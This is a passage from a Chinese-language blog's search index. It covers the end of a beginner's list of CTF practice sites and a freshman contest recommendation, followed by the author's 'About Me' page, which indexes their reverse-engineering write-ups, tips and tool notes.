href="https://0xffff.one/t/ctf">0xFFFF</a></p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602823777-31069-20201015220754.png" alt="0xFFFF"></p><p>是一个很多dalao水的论坛！干货很多实名安利！</p><p>不只是CTF区，其他的区也有很多好玩的帖子，建议多逛 <del>（潜水玩家捂头跑路）</del>。</p></li><li><p><a href="https://adworld.xctf.org.cn/task">攻防世界</a>【刷题网站】</p><p><img src="/p/blogsFor-CTF-Starters/image-20201204183259043.png" alt="攻防世界"></p><p>这里有一个专门刷题的答题区，准备新生赛的话可以考虑一下把对应方向的新手练习区按上面说的方法刷一遍hhh（其实感觉新手练习区有些题目也是偏难的XD）</p><p>而且有些比赛也是在这个平台上举办的，先搞个账号不亏2333。</p></li><li><p><a href="https://www.ctfhub.com/#/index">CTFHub</a>【刷题网站】</p><p><img src="/p/blogsFor-CTF-Starters/image-20201204183407950.png" alt="CTFHub"></p><p>这个网站其实是一个hub一样的集合类网站，这个技能树看起来包括的方面还挺全的 <del>（就是还没多少题orz 毕竟新站）</del></p><p>不过赛事中心&amp;历年真题&amp;工具部分还是挺不错的，想复盘可以去找找题目，需要什么工具可以找找（说不定就找到了</p></li><li><p><a href="https://ctf.pediy.com/itembank.htm">看雪</a>【刷题网站？】</p><p><img src="/p/blogsFor-CTF-Starters/image-20201204183531161.png" alt="看雪-CTF题库"></p><p>打个问号是因为我觉得它还是更偏向于论坛hhh 刷题这块的功能没怎么用过。</p><p>论坛还是很不错的，有很多干货&amp;资源分享&gt;&lt;</p></li><li><p><a href="https://www.52pojie.cn/">吾爱破解</a></p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602829653-253485-5fd7df3e-ad40-48bb-b532-99f7885845ec.png" alt="吾爱破解"></p><p>也是个干货&amp;&amp;资源的论坛集合，安利！</p></li><li><p><a href="https://ctf.bugku.com/challenges">Bugku CTF</a>【刷题网站】</p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602829634-986459-bugku.png" alt="Bugku CTF"></p><p>刷题网站+1，各个方向的题目分类很明确，不过难度好像没按顺序排？杂项题目类型还是挺丰富的，建议安排一下。</p><p>不过新生赛以后也没用这个刷过题了&#x3D; &#x3D;可能有理解偏差x</p></li><li><p>CTF wiki（<a href="https://wiki.x10sec.org/">https://wiki.x10sec.org/</a> or <a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a>）</p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602835121-514430-20201016155731.png" alt="CTF wiki"></p><p>经楼下web大佬提醒，补充一个CTF各种基础知识大全的网站！</p><p>像逆向方面我觉得题型写得比较全，<del>看完说不定对新生赛有用（手动狗头</del></p></li><li><p><a href="https://www.yuque.com/0xffff.one/cs-learning/eng3v3">0xFFFF CS Wiki - 信息安全</a></p><p><img src="https://static.0xffff.one/assets/files/2020-10-16/1602853022-889389-20201016205454.png" alt="0xFFFF CS Wiki - 信息安全"></p><p>突然发现0xFFFF CS Wiki上有给CTF的介绍和一些网站的集合，mark一下。</p><p>（看到pwn部分整理了少而精的链接，试图增加pwn的工具ing</p></li><li><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/">CTF All In One</a></p><p><img src="https://static.0xffff.one/assets/files/2020-10-20/1603161493-103441-20201020103752.png" alt="CTF All In One"></p><p>一个CTF相关的百科全书！各个方向的入门基础&amp;题目&amp;工具都挺全的，有时间可以刷一下0v0</p></li></ol><h1 id="最后强推华师CTF新生赛给想入门的小朋友们！"><a href="#最后强推华师CTF新生赛给想入门的小朋友们！" class="headerlink" title="最后强推华师CTF新生赛给想入门的小朋友们！"></a>最后强推华师CTF新生赛给想入门的小朋友们！</h1><p>华师CTF新生赛是一个非常非常友好的入门起点，如果**你感兴趣的话，快关注今年的CTF新生赛呀(づ◡ど)**。不仅奖品丰富实用（至少是我参加那么多比赛以来拿到最多奖品的一个），还能顺便入门CTF，何乐而不为呢2333 &gt;v&lt;</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> zero2one/入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>-=-=-= About Me -=-=-=</title>
      <link href="p/blogsFor-AboutMe-Pinned/"/>
      <url>p/blogsFor-AboutMe-Pinned/</url>
      
        <content type="html"><![CDATA[<blockquote><p>感谢看到这个小基地的朋友们！0v0</p></blockquote><p>&gt; 这里是努力修行ing的CTF逆向手 <em>c10udlnk</em>  &lt;</p><p>&gt; 也是一个网络安全方向的SCNUer &lt;</p><hr><ul><li>平时在这儿放一些乱七八糟的学习笔记，如有哪里写得不妥欢迎捉虫。</li><li>日常还是一个音游人+ow支援位玩家，想跟同好师傅一块玩~</li><li>线下是个重度脸盲人，求朋友们多多担待TAT</li></ul><p><small>这篇持续更新的置顶给文章按类别整个归档，顺便写点碎碎念啥的（ <del>其实是方便自己找</del> </small></p><p>&#x3D;&#x3D;&#x3D;</p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><h2 id="Articles"><a href="#Articles" class="headerlink" title="-Articles-"></a><small>-Articles-</small></h2><p>一些所思所想，和捣鼓各种东西的记录文章。</p><p>&#x3D;&#x3D;</p><ul><li>CTF入门指北：<a href="https://c10udlnk.top/p/blogsFor-CTF-Starters/">CTF：从0到1 -&gt; zero2one</a>（感觉CTF跟音游一样都是要多练的hhh</li><li>Hexo相关：<a href="https://c10udlnk.top/p/blogsFor-Enjoying-hexo/">如何从无到有搭建属于你的hexo博客</a></li><li>自定义Live2d：<a href="https://c10udlnk.top/p/blogsFor-My-twisty-experience-on-Live2d/">我的自定义多交互live2d折腾经历</a></li><li>背景代码雨特效：<a href="https://c10udlnk.top/p/blogsFor-hexo-addingDigitalRainInMelody/">Melody主题的背景代码雨特效</a></li></ul><p>&#x3D;&#x3D;</p><h2 id="CSAPP摸鱼向"><a href="#CSAPP摸鱼向" class="headerlink" title="CSAPP摸鱼向"></a>CSAPP摸鱼向</h2><ul><li><a href="https://c10udlnk.top/p/csappLAB-BufferLab/">【CSAPP】以CTFer的方式打开BufferLab</a></li></ul><p>&#x3D;&#x3D;&#x3D;</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h1><h2 id="Articles-1"><a href="#Articles-1" class="headerlink" title="-Articles-"></a><small>-Articles-</small></h2><p>之前打的一些比赛的wp，有些是赛中写的，有些是赛后复盘。</p><p><del>（除了wp以外还可能会随机掉落小吐槽</del></p><p>&#x3D;&#x3D;</p><ul><li><a href="https://c10udlnk.top/p/wpFor-2020HSCTF/">【wp】2020HSCTF_PC逆向</a></li><li><a href="https://c10udlnk.top/p/wpFor-2020chamd5XMAS/">【wp】2020ChaMd5圣诞题</a></li><li><a href="https://c10udlnk.top/p/wpFor-2020XCTF/">【wp】2020XCTF_逆向</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021HWSTrial/">【wp】HWS计划2021硬件安全冬令营线上选拔赛</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021VNCTF/">【wp】2021V&amp;NCTF</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021MARDASCTF/">【wp】2021MAR-DASCTF_逆向</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021RedHat-PicPic/">【wp】2021红帽杯-PicPic</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021CISCNprelude/">【wp】2021CISCN初赛</a></li></ul><p>&#x3D;&#x3D;</p><ul><li><a href="https://c10udlnk.top/p/wpFor-2021iscc/">【wp】2021ISCC</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021chunqiucap-BabySteg/">【wp】2021春秋杯-BabySteg</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021CISCNsemifinal/">【wp】2021CISCN华南赛区分区赛-BadGameAndCrazy</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021qwb">【wp】2021强网杯-ExtremelySlow</a></li><li><a href="https://c10udlnk.top/p/wpFor-2021JulyDASCTF/">【wp】2021DASCTF July X CBCTF 4th</a></li></ul><p>&#x3D;&#x3D;&#x3D;</p><h1 id="RE套路"><a href="#RE套路" class="headerlink" title="RE套路"></a>RE套路</h1><h2 id="Articles-2"><a href="#Articles-2" class="headerlink" title="-Articles-"></a><small>-Articles-</small></h2><p>感觉有必要整理的一些做题过程中常见的小套路，说不定有奇效。</p><p>&#x3D;&#x3D;</p><h2 id="一些基操"><a href="#一些基操" class="headerlink" title="一些基操"></a>一些基操</h2><ul><li><a href="https://c10udlnk.top/p/reSkillsOn-Pyinstaller-extracted-to-python/">RE套路 - 关于pyinstaller打包文件的复原</a></li><li><a href="https://c10udlnk.top/p/reSkillsOn-Debugging/">RE套路 - 关于使用IDA 7.0前端进行的动态调试</a></li><li><a href="https://c10udlnk.top/p/reSkillsOn-ALLaboutJunkCode/">RE套路 - 关于逆向常客花指令</a></li></ul><p>&#x3D;&#x3D;</p><h2 id="从例题学技巧"><a href="#从例题学技巧" class="headerlink" title="从例题学技巧"></a>从例题学技巧</h2><ul><li><a href="https://c10udlnk.top/p/reSkillsOn-Unpack-from-nsPack/">RE套路&#x2F;从crackme学nsPack手动脱壳</a></li><li><a href="https://c10udlnk.top/p/reSkillsOn-Inline-hook/">RE套路&#x2F;从EASYHOOK学inline hook</a></li></ul><p>&#x3D;&#x3D;&#x3D;</p><h1 id="RE工具相关"><a href="#RE工具相关" class="headerlink" title="RE工具相关"></a>RE工具相关</h1><h2 id="Articles-3"><a href="#Articles-3" class="headerlink" title="-Articles-"></a><small>-Articles-</small></h2><p>折腾很久的工具安装记录。</p><p>&#x3D;&#x3D;</p><ul><li><a href="https://c10udlnk.top/p/toolsOf-IDAold/">【从无到有】配置IDA7.0</a></li><li><a href="https://c10udlnk.top/p/toolsOf-Pintool/">【从无到有】Pintool安装&amp;使用</a></li><li><a href="https://c10udlnk.top/p/toolsOf-Qira-on-ubuntu-1804/">【从无到有】qira在Ubuntu 18.04下的安装&amp;使用</a></li></ul><p>&#x3D;&#x3D;&#x3D;</p><h1 id="刷题小记"><a href="#刷题小记" class="headerlink" title="刷题小记"></a>刷题小记</h1><h2 id="Articles-4"><a href="#Articles-4" class="headerlink" title="-Articles-"></a><small>-Articles-</small></h2><p>持续更新的刷题log，虽然都是开了个坑后续超级缓慢地在填坑（</p><p>&#x3D;&#x3D;</p><ul><li><a href="https://c10udlnk.top/p/logFor-Angr-CTF/">angr_ctf刷题小记</a></li><li><a href="https://c10udlnk.top/p/logFor-RealProbs-in-adworld-XCTF/">历年真题刷题小记</a></li></ul><p>&#x3D;&#x3D;&#x3D;</p><h1 id="GitHub-Repos"><a href="#GitHub-Repos" class="headerlink" title="GitHub Repos"></a>GitHub Repos</h1><p>&#x3D;&#x3D;</p><h2 id="myReverseExps"><a href="#myReverseExps" class="headerlink" title="myReverseExps"></a>myReverseExps</h2><p>link-&gt; <a href="https://github.com/c10udlnk/myReverseExps">c10udlnk&#x2F;myReverseExps: Some common reverse exps in CTF.</a></p><p>自己总结编写的一些逆向常用脚本&amp;&amp;常见加密&#x2F;编码的实现源码和比赛时用的处理脚本。</p><p>&#x3D;&#x3D;</p><h2 id="hexo-T1meM4chine"><a href="#hexo-T1meM4chine" class="headerlink" title="hexo-T1meM4chine"></a>hexo-T1meM4chine</h2><p>link-&gt; <a href="https://github.com/c10udlnk/hexo-T1meM4chine">c10udlnk&#x2F;hexo-T1meM4chine: 为你的hexo博客生成年度数据报告！</a></p><p>一时兴起的开发灵感，目前就做了个雏形，等有想法的时候再去填TODO好了（咕咕咕。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
